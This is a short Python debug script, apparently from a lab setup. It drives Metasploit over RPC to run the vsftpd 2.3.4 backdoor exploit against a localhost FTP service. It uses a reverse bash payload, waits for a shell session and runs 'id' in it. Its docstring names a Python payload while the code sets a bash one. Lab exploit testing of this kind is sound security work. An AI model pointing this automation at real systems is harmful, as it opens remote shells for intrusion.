"""Debug #5: cmd/unix/reverse_python — handler real de msf, sesion real."""
import time

from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient(
    password="whlab-test-pass", username="msfapi", server="127.0.0.1",
    port=55553, uri="/api/", ssl=True,
)
console = client.consoles.console()
print("console:", console.cid)
console.write("use exploit/unix/ftp/vsftpd_234_backdoor\n")
console.write("set RHOSTS 127.0.0.1\n")
console.write("set RPORT 2121\n")
console.write("set PAYLOAD cmd/unix/reverse_bash\n")
console.write("set LHOST 127.0.0.1\n")
console.write("set VERBOSE 1\n")
console.write("run -j\n")

start = time.time()
buf = ""
done_at = None
while time.time() - start < 80:
    time.sleep(3)
    data = console.read()
    if data.get("data"):
        buf += data["data"]
        if "Exploit completed" in data["data"] or "session" in data["data"].lower():
            done_at = done_at or time.time()
    sess = client.sessions.list
    tail = buf[-100:].replace("\n", " | ")
    print(f"[{int(time.time()-start):3d}s] sesiones={len(sess)} :: {tail}")
    if sess:
        sid = list(sess.keys())[0]
        info = list(sess.values())[0]
        print("SESION:", sid, "|", info.get("desc"), "| type:", info.get("type"))
        sh = client.sessions.session(sid)
        sh.write("id\n")
        time.sleep(2)
        print(">>> output de la sesion:", sh.read()[:250])
        break
    if done_at and time.time() - done_at > 12:
        print("modulo termino sin sesion")
        break
